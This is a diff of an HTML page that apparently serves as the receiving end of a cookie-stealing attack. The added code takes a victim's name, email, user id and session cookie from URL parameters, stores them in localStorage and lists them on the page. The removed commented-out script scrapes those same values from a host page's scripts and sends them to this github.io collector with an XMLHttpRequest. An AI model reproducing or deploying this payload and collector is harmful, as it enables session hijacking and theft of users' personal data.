@@ -12,87 +12,37 @@
         <script>
             
             url = document.URL
-            localStorage.clear()
-            //being given the url of the form https://maxjdobrei.github.io/temp/index.html?n=bob&c=HFEBLjh
-            //need to isolate the name and cookie values            
-            // if (url.includes("?"))
-            // {
-            //     params = url.split("?")[1].split("&")
-            //     name = params[0].split("=")[1]
-            //     email = params[1].split("=")[1]
-            //     userid = params[2].split("=")[1]
-            //     cookie = params[3].split("=")[1]
-            //     let arr = [email, userid, cookie]
+            //localStorage.clear()
+           
+            //being given the url of the form https://maxjdobrei.github.io/temp/index.html?n=max&email=max@gmail.com&userid=max&c=abcdefg
+            //need to isolate the parameters     
+            if (url.includes("?"))
+            {
+                params = url.split("?")[1].split("&")
+                name = params[0].split("=")[1]
+                email = params[1].split("=")[1]
+                userid = params[2].split("=")[1]
+                cookie = params[3].split("=")[1]
+                let arr = [email, userid, cookie]
 
-            //     localStorage.setItem(name, arr)
-            // }
+                localStorage.setItem(name, arr)
+            }
             
-            // let s = ""
-            // for (let i = 0; i < localStorage.length; i++)
-            // {
-            //     name = localStorage.key(i)
-            //     arr = localStorage.getItem(name)
+            let s = ""
+            for (let i = 0; i < localStorage.length; i++)
+            {
+                name = localStorage.key(i)
+                arr = localStorage.getItem(name)
                 
-            //     s = "Name: " +name +", Email: " +arr[0] +", Userid: " +arr[1] +", Cookie: " +arr[2]
+                s = "Name: " +name +", Email: " +arr[0] +", Userid: " +arr[1] +", Cookie: " +arr[2]
             
-            //     const para = document.createElement("p");
-            //     para.innerText = s
-            //     document.body.appendChild(para);
+                const para = document.createElement("p");
+                para.innerText = s
+                document.body.appendChild(para);
             
-            // }
-
-            
+            }
 
         </script>
-              
-        <!-- <script>
-            userid = ""
-            name = ""
-            email = ""
-            cookie = "" 
-            
-            s = document.getElementsByTagName("script")
-            for (let i = 0; i < s.length; i++)
-            {
-                let sc = s.item(i)
-                if (sc == document.currentScript){
-                    continue
-                }
-                
-                if (sc.innerHTML.includes("email"))
-                {
-                    console.log(sc.innerHTML)
-                    let str = sc.innerHTML
-                    str = str.replaceAll("\"", "")
-                    str = str.replaceAll("\\", "")
-                    console.log(str)
-                    arr = str.split(":")
-                    console.log(arr.length)
-                    for (let j = 0; j < arr.length; j++)
-                    {
-                        if (arr[j] == "{name")
-                        {
-                            name = arr[j+1].split(",")[0].replace(" ", "")
-                            email = arr[j+2].split(",")[0]
-                            userid = arr[j+5].split(",")[0]
-                            cookie = arr[j+7].split(",")[0]
-                            
-                            url = "maxjdobrei.github.io/_temp/index.html?n=" +name +"&e=" +email +"&uid=" +userid +"&c=" +cookie
-
-                            let xhttp = new XMLHttpRequest()
-
-                            xhttp.open("GET", url)
-                            xhttp.send()
-
-                            break
-                        }
-                    }                    
-                    break
-                }
-            }
-        </script> -->
-
-
 
 </body>
 
